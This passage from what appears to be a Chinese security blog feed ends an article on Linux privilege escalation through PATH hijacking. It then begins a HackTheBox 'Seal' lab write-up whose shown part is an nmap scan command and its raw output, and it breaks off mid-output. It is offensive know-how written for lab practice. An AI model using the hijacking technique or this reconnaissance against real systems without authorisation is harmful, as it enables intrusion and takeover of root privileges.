src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/0e25ae391baa40d0ab794baf043e8215.png" alt="在这里插入图片描述"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/7df1491fd39c4d43adc0680b5de6a72a.png" alt="在这里插入图片描述"></p><p>此时，执行命令<code>ls</code>，这将运行目录下的<code>ls</code>即<code>./ls</code>而不是我们所熟知的<code>ls</code></p><p>现在，如果root用户以root特权执行代码，我们可以使用root特权实现任意代码执行。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/04/img/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83-Linux.assets/3f5307fef3ad4bf98c64423710b1029c-164658049401531.png" alt="在这里插入图片描述"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>参考：<a href="https://www.freebuf.com/articles/251884.html">https://www.freebuf.com/articles/251884.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>实战总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Seal</title>
    <link href="/2021/12/13/HTB/Seal/"/>
    <url>/2021/12/13/HTB/Seal/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-端口信息"><a href="#0x01-端口信息" class="headerlink" title="0x01 端口信息"></a>0x01 端口信息</h1><p>使用nmap对靶机进行端口探测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sC -sV -v 10.10.10.22<br></code></pre></td></tr></table></figure><p>结果如下：</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>    <span class="hljs-variable">VERSION</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>        <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.2</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.2</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">ssh</span><span class="hljs-operator">-</span><span class="hljs-variable">hostkey</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-number">3072</span> <span class="hljs-number">4</span>b:<span class="hljs-number">89</span>:<span class="hljs-number">47</span>:<span class="hljs-number">39</span>:<span class="hljs-number">67</span>:<span class="hljs-number">3</span>d:<span class="hljs-number">07</span>:<span class="hljs-number">31</span>:<span class="hljs-number">5</span>e:<span class="hljs-number">3</span>f:<span class="hljs-number">4</span>c:<span class="hljs-number">27</span>:<span class="hljs-number">41</span>:<span class="hljs-number">1</span>f:<span class="hljs-variable">f9</span>:<span class="hljs-number">67</span> (<span class="hljs-variable">RSA</span>)<br><span class="hljs-operator">|</span>   <span class="hljs-number">256</span> <span class="hljs-number">04</span>:<span class="hljs-variable">a7</span>:<span class="hljs-number">4</span>f:<span class="hljs-number">39</span>:<span class="hljs-number">95</span>:<span class="hljs-number">65</span>:<span class="hljs-variable">c5</span>:<span class="hljs-variable">b0</span>:<span class="hljs-number">8</span>d:<span class="hljs-variable">d5</span>:<span class="hljs-number">49</span>:<span class="hljs-number">2</span>e:<span class="hljs-variable">d8</span>:<span class="hljs-number">44</span>:<span class="hljs-number">00</span>:<span class="hljs-number">36</span> (<span class="hljs-variable">ECDSA</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-number">256</span> <span class="hljs-variable">b4</span>:<span class="hljs-number">5</span>e:<span class="hljs-number">83</span>:<span class="hljs-number">93</span>:<span class="hljs-variable">c5</span>:<span class="hljs-number">42</span>:<span class="hljs-number">49</span>:<span class="hljs-variable">de</span>:<span class="hljs-number">71</span>:<span class="hljs-number">25</span>:<span class="hljs-number">92</span>:<span class="hljs-number">71</span>:<span class="hljs-number">23</span>:<span class="hljs-variable">b1</span>:<span class="hljs-number">85</span>:<span class="hljs-number">54</span> (<span class="hljs-variable">ED25519</span>)<br><span class="hljs-number">443</span>/<span class="hljs-variable">tcp</span>  <span class="hljs-variable">open</span>  <span class="hljs-variable">ssl</span>/<span class="hljs-variable">http</span>   <span class="hljs-variable">nginx</span> <span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (<span class="hljs-title class_">Ubuntu</span>)<br><span class="hljs-operator">|</span> <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">methods</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">Supported</span> <span class="hljs-title class_">Methods</span>: <span class="hljs-variable">OPTIONS</span> <span class="hljs-variable">GET</span> <span class="hljs-variable">HEAD</span> <span class="hljs-variable">POST</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">server</span><span class="hljs-operator">-</span><span class="hljs-variable">header</span>: <span class="hljs-variable">nginx</span>/<span class="hljs-number">1.18</span><span class="hljs-number">.0</span> (<span class="hljs-title class_">Ubuntu</span>)<br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">title</span>: <span class="hljs-title class_">Seal</span> <span class="hljs-title class_">Market</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">ssl</span><span class="hljs-operator">-</span><span class="hljs-variable">cert</span>: <span class="hljs-title class_">Subject</span>: <span class="hljs-variable">commonName</span><span class="hljs-operator">=</span><span class="hljs-variable">seal</span>.<span class="hljs-property">htb</span>/<span class="hljs-variable">organizationName</span><span class="hljs-operator">=</span><span class="hljs-title class_">Seal</span> <span class="hljs-title class_">Pvt</span> <span class="hljs-title class_">Ltd</span>/<span class="hljs-variable">stateOrProvinceName</span><span class="hljs-operator">=</span><span class="hljs-title class_">London</span>/<span class="hljs-variable">countryName</span><span class="hljs-operator">=</span><span class="hljs-variable">UK</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Issuer</span>: <span class="hljs-variable">commonName</span><span class="hljs-operator">=</span><span class="hljs-variable">seal</span>.<span class="hljs-property">htb</span>/<span class="hljs-variable">organizationName</span><span class="hljs-operator">=</span><span class="hljs-title class_">Seal</span> <span class="hljs-title class_">Pvt</span> <span class="hljs-title class_">Ltd</span>/<span class="hljs-variable">stateOrProvinceName</span><span class="hljs-operator">=</span><span class="hljs-title class_">London</span>/<span class="hljs-variable">countryName</span><span class="hljs-operator">=</span><span class="hljs-variable">UK</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span> <span class="hljs-variable">type</span>: <span class="hljs-variable">rsa</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Public</span> <span class="hljs-title class_">Key</span> <span class="hljs-variable">bits</span>: <span class="hljs-number">2048</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Signature</span> <span class="hljs-title class_">Algorithm</span>: <span class="hljs-variable">sha256WithRSAEncryption</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Not</span> <span class="hljs-variable">valid</span> <span class="hljs-variable">before</span>: <span class="hljs-number">2021</span><span class="hljs-number">-05</span><span class="hljs-number">-05</span>T10:<span class="hljs-number">24</span>:<span class="hljs-number">03</span><br><span class="hljs-operator">|</span> <span class="hljs-title class_">Not</span> <span class="hljs-variable">valid</span> <span class="hljs-variable">after</span>:  <span class="hljs-number">2022</span><span class="hljs-number">-05</span><span class="hljs-number">-05</span>T10:<span class="hljs-number">24</span>:<span class="hljs-number">03</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">MD5</span>:   <span class="hljs-number">9</span>c4f <span class="hljs-number">991</span>a <span class="hljs-variable">bb97</span> <span class="hljs-number">192</span>c <span class="hljs-variable">df5a</span> <span class="hljs-variable">c513</span> <span class="hljs-number">057</span>d <span class="hljs-number">4</span>d21<br><span class="hljs-operator">|</span><span class="hljs-variable">_SHA</span><span class="hljs-number">-1</span>: <span class="hljs-number">0</span>de4 <span class="hljs-number">6873</span> <span class="hljs-number">0</span>ab7 <span class="hljs-number">3</span>f90 <span class="hljs-variable">c317</span> <span class="hljs-number">0</span>f7b <span class="hljs-number">872</span>f <span class="hljs-number">155</span>b <span class="hljs-number">305</span>e <span class="hljs-number">54</span>ef<br><span class="hljs-operator">|</span> <span class="hljs-variable">tls</span><span class="hljs-operator">-</span><span class="hljs-variable">alpn</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">http</span>/<span class="hljs-number">1.1</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">tls</span><span class="hljs-operator">-</span><span class="hljs-variable">nextprotoneg</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-variable">http</span>/<span class="hljs-number">1.1</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">fingerprint</span><span class="hljs-operator">-</span><span class="hljs-variable">strings</span>: <br><span class="hljs-operator">|</span>   <span class="hljs-title class_">FourOhFourRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <span class="hljs-title class_">Unauthorized</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Mon</span>, <span class="hljs-number">13</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">2021</span> <span class="hljs-number">01</span>:<span class="hljs-number">34</span>:<span class="hljs-number">13</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">JSESSIONID</span><span class="hljs-operator">=</span><span class="hljs-variable">node0z5n4sbc9hnjors2ulsqy6jnq155</span>.<span class="hljs-property">node0</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Expires</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">01</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">GetRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <span class="hljs-title class_">Unauthorized</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Mon</span>, <span class="hljs-number">13</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">2021</span> <span class="hljs-number">01</span>:<span class="hljs-number">34</span>:<span class="hljs-number">08</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">JSESSIONID</span><span class="hljs-operator">=</span><span class="hljs-variable">node09xtpsxy6z9pabh0g6yyqtajg153</span>.<span class="hljs-property">node0</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Expires</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">01</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">HTTPOptions</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">200</span> <span class="hljs-variable">OK</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Date</span>: <span class="hljs-title class_">Mon</span>, <span class="hljs-number">13</span> <span class="hljs-title class_">Dec</span> <span class="hljs-number">2021</span> <span class="hljs-number">01</span>:<span class="hljs-number">34</span>:<span class="hljs-number">09</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Set</span><span class="hljs-operator">-</span><span class="hljs-title class_">Cookie</span>: <span class="hljs-variable">JSESSIONID</span><span class="hljs-operator">=</span><span class="hljs-variable">node01nxswyk2xedhj14uol8ldn80oh154</span>.<span class="hljs-property">node0</span>; <span class="hljs-title class_">Path</span><span class="hljs-operator">=</span>/; <span class="hljs-title class_">HttpOnly</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Expires</span>: <span class="hljs-title class_">Thu</span>, <span class="hljs-number">01</span> <span class="hljs-title class_">Jan</span> <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> <span class="hljs-variable">GMT</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Allow</span>: <span class="hljs-variable">GET</span>,<span class="hljs-variable">HEAD</span>,<span class="hljs-variable">POST</span>,<span class="hljs-variable">OPTIONS</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">0</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">RPCCheck</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">OTEXT</span><span class="hljs-operator">=</span><span class="hljs-number">0x80</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">71</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">400</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">OTEXT</span><span class="hljs-operator">=</span><span class="hljs-number">0x80</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">RTSPRequest</span>: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">505</span> <span class="hljs-title class_">Unknown</span> <span class="hljs-title class_">Version</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">58</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">505</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Unknown</span> <span class="hljs-title class_">Version</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Socks</span>4: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x4</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">69</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span>     <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">400</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x4</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span>   <span class="hljs-title class_">Socks</span>5: <br><span class="hljs-operator">|</span>     <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">400</span> <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x5</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Type</span>: <span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span>iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Content</span><span class="hljs-operator">-</span><span class="hljs-title class_">Length</span>: <span class="hljs-number">69</span><br><span class="hljs-operator">|</span>     <span class="hljs-title class_">Connection</span>: <span class="hljs-variable">close</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>    <span class="hljs-operator">&lt;</span><span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-title class_">Bad</span> <span class="hljs-title class_">Message</span> <span class="hljs-number">400</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">h1</span><span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span><span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><span class="hljs-variable">reason</span>: <span class="hljs-title class_">Illegal</span> <span class="hljs-variable">character</span> <span class="hljs-variable">CNTL</span><span class="hljs-operator">=</span><span class="hljs-number">0x5</span><span class="hljs-operator">&lt;</span>/<span class="hljs-variable">pre</span><span class="hljs-operator">&gt;</span><br><span class="hljs-operator">|</span> <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">auth</span>: <br><span class="hljs-operator">|</span> <span class="hljs-variable">HTTP</span>/<span class="hljs-number">1.1</span> <span class="hljs-number">401</span> <span class="hljs-title class_">Unauthorized</span>\<span class="hljs-variable">x0D</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">Server</span> returned <span class="hljs-variable">status</span> <span class="hljs-number">401</span> <span class="hljs-variable">but</span> <span class="hljs-variable">no</span> <span class="hljs-variable">WWW</span><span class="hljs-operator">-</span><span class="hljs-title class_">Authenticate</span> <span class="hljs-variable">header</span>.<br><span class="hljs-operator">|</span> <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">methods</span>: <br><span class="hljs-operator">|</span><span class="hljs-variable">_</span>  <span class="hljs-title class_">Supported</span> <span class="hljs-title class_">Methods</span>: <span class="hljs-variable">GET</span> <span class="hljs-variable">HEAD</span> <span class="hljs-variable">POST</span> <span class="hljs-variable">OPTIONS</span><br><span class="hljs-operator">|</span><span class="hljs-variable">_http</span><span class="hljs-operator">-</span><span class="hljs-variable">title</span>: <span class="hljs-title class_">Site</span> <span class="hljs-variable">doesn</span>&#x27;<span class="hljs-variable">t</span> <span class="hljs-variable">have</span> <span class="hljs-variable">a</span> <span class="hljs-title function_">title</span> (<span class="hljs-variable">text</span>/<span class="hljs-variable">html</span>;<span class="hljs-variable">charset</span><span class="hljs-operator">=</span><span class="hljs-variable">utf</span><span class="hljs-number">-8</span>).<br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>8080<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.91</span><span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">12</span>/<span class="hljs-number">13</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">61</span>B6A310<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-variable">G</span><br><span class="hljs-variable">SF</span>:<span class="hljs-variable">etRequest</span>,<span class="hljs-variable">F5</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>401<span class="hljs-char escape_">\x20</span>Unauthorized<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Mon,<span class="hljs-char escape_">\x20</span>13\x</span><br><span class="hljs-string">SF:20Dec<span class="hljs-char escape_">\x20</span>2021<span class="hljs-char escape_">\x20</span>01:34:08<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Set-Cookie:<span class="hljs-char escape_">\x20</span>JSESSIONID=node09xtp</span><br><span class="hljs-string">SF:sxy6z9pabh0g6yyqtajg153\.node0;<span class="hljs-char escape_">\x20</span>Path=/;<span class="hljs-char escape_">\x20</span>HttpOnly<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Expires:<span class="hljs-char escape_">\x20</span>T</span><br><span class="hljs-string">SF:hu,<span class="hljs-char escape_">\x20</span>01<span class="hljs-char escape_">\x20</span>Jan<span class="hljs-char escape_">\x20</span>1970<span class="hljs-char escape_">\x20</span>00:00:00<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/ht</span><br><span class="hljs-string">SF:ml;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">10</span>B,<span class="hljs-string">&quot;H</span><br><span class="hljs-string">SF:TTP/1\.1<span class="hljs-char escape_">\x20</span>200<span class="hljs-char escape_">\x20</span>OK<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Mon,<span class="hljs-char escape_">\x20</span>13<span class="hljs-char 